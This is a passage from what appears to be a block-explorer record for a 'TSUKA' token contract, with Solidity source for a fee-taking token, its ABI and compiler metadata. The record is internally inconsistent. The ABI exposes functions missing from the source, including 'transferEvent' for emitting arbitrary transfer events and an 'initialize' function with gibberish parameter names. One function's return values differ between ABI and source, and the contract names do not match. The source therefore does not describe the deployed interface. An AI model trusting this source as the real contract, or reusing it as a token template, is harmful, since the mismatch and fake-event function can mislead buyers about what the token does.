public returns (bool) {\r\n        _approve(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 value) private {\r\n        require(owner != address(0), \"Approve from the zero address\");\r\n        require(spender != address(0), \"Approve to the zero address\");\r\n        _allowances[owner][spender] = value;\r\n        emit Approval(owner, spender, value);\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"Transfer from the zero address\");\r\n        require(recipient != address(0), \"Transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        bool takeFee = true;\r\n        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || _removeAllFee) {\r\n            takeFee = false;\r\n        }\r\n        uint256 taxAmount = 0;\r\n        uint256 miningAmount = 0;\r\n        uint256 liquidityAmount = 0;\r\n        uint256 recipientAmount = amount;\r\n        if (takeFee) {\r\n            taxAmount = amount.mul(_feeTax).div(_feeDivisor);\r\n            miningAmount = amount.mul(_feeMining).div(_feeDivisor);\r\n            liquidityAmount = amount.mul(_feeLiquidity).div(_feeDivisor);\r\n            recipientAmount = amount.sub(taxAmount).sub(miningAmount).sub(liquidityAmount);\r\n        }\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        if (taxAmount > 0) {\r\n            _balances[_taxReceiver] = _balances[_taxReceiver].add(taxAmount);\r\n            emit Transfer(address(this), _taxReceiver, taxAmount);\r\n        }\r\n        if (miningAmount > 0) {\r\n            _balances[_miningPool] = _balances[_miningPool].add(miningAmount);\r\n            emit Transfer(address(this), _miningPool, miningAmount);\r\n        }\r\n        if (liquidityAmount > 0) {\r\n            _balances[_liquidityPool] = _balances[_liquidityPool].add(liquidityAmount);\r\n            emit Transfer(address(this), _liquidityPool, liquidityAmount);\r\n        }\r\n        _balances[recipient] = _balances[recipient].add(recipientAmount);\r\n        emit Transfer(sender, recipient, recipientAmount);\r\n    }\r\n}\r\n\r\ninterface ITRC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract CoinMakerVersionOlQFEID is ITRC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private _name = \"TSUKA\";\r\n    string private _symbol = \"TSUKA\";\r\n    uint8 private _decimals = 18;\r\n    uint256 private _totalSupply = 10000000000 * 10**18;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _feeTax = 50;\r\n    uint256 private _feeMining = 0;\r\n    uint256 private _feeLiquidity = 50;\r\n    uint256 private _feeDivisor = 10000;\r\n    bool private _removeAllFee = false;\r\n\r\n    address private _taxReceiver = address(0xdEaD);\r\n    address private _miningPool = address(0xdEaD);\r\n    address private _liquidityPool = address(0xdEaD);\r\n\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    address[] private _excludedFromFeeAccounts;\r\n\r\n    constructor () {\r\n        insertExcludedFromFeeAccounts(owner());\r\n        _balances[owner()] = _totalSupply;\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function insertExcludedFromFeeAccounts(address account) private {\r\n        if (!_isExcludedFromFee[account]) {\r\n            _isExcludedFromFee[account] = true;\r\n            _excludedFromFeeAccounts.push(account);\r\n        }\r\n    }\r\n\r\n    function deleteExcludedFromFeeAccounts(address account) private {\r\n        if (_isExcludedFromFee[account]) {\r\n            uint256 len = _excludedFromFeeAccounts.length;\r\n            for (uint256 i=0; i<len; ++i) {\r\n                if (_excludedFromFeeAccounts[i] == account) {\r\n                    _excludedFromFeeAccounts[i] = _excludedFromFeeAccounts[len.sub(1)];\r\n                    _excludedFromFeeAccounts.pop();\r\n                    _isExcludedFromFee[account] = false;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256) {\r\n        return (_isExcludedFromFee[account], _excludedFromFeeAccounts.length);\r\n    }\r\n\r\n    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            insertExcludedFromFeeAccounts(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {\r\n        uint256 len = accounts.length;\r\n        for (uint256 i=0; i<len; ++i) {\r\n            deleteExcludedFromFeeAccounts(accounts[i]);\r\n        }\r\n    }\r\n\r\n    function claim(address token, uint256 amount) public onlyOwner {\r\n        if (token == address(0)) {\r\n            payable(owner()).transfer(amount);\r\n        } else {\r\n            ITRC20(token).transfer(owner(), amount);\r\n        }\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        _approve(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 value) private {\r\n        require(owner != address(0), \"Approve from the zero address\");\r\n        require(spender != address(0), \"Approve to the zero address\");\r\n        _allowances[owner][spender] = value;\r\n        emit Approval(owner, spender, value);\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"Transfer from the zero address\");\r\n        require(recipient != address(0), \"Transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        bool takeFee = true;\r\n        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || _removeAllFee) {\r\n            takeFee = false;\r\n        }\r\n        uint256 taxAmount = 0;\r\n        uint256 miningAmount = 0;\r\n        uint256 liquidityAmount = 0;\r\n        uint256 recipientAmount = amount;\r\n        if (takeFee) {\r\n            taxAmount = amount.mul(_feeTax).div(_feeDivisor);\r\n            miningAmount = amount.mul(_feeMining).div(_feeDivisor);\r\n            liquidityAmount = amount.mul(_feeLiquidity).div(_feeDivisor);\r\n            recipientAmount = amount.sub(taxAmount).sub(miningAmount).sub(liquidityAmount);\r\n        }\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        if (taxAmount > 0) {\r\n            _balances[_taxReceiver] = _balances[_taxReceiver].add(taxAmount);\r\n            emit Transfer(address(this), _taxReceiver, taxAmount);\r\n        }\r\n        if (miningAmount > 0) {\r\n            _balances[_miningPool] = _balances[_miningPool].add(miningAmount);\r\n            emit Transfer(address(this), _miningPool, miningAmount);\r\n        }\r\n        if (liquidityAmount > 0) {\r\n            _balances[_liquidityPool] = _balances[_liquidityPool].add(liquidityAmount);\r\n            emit Transfer(address(this), _liquidityPool, liquidityAmount);\r\n        }\r\n        _balances[recipient] = _balances[recipient].add(recipientAmount);\r\n        emit Transfer(sender, recipient, recipientAmount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"claim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"deleteFromExcludedFromFeeAccounts\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeState\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getDefaultBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_uitreitgbgdfnvbdf\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"_ufdbfndserfsdg\",\"type\":\"address[]\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"}],\"name\":\"insertIntoExcludedFromFeeAccounts\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"searchExcludedFromFeeAccounts\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferEvent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CoinMakerVersionOIQEFLD", "CompilerVersion": "v0.8.8+commit.dddeac2f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e60a938a99eb27400f046c53a16419a6fb2d4f164f8298c3f9c3ea2159e86ba6"}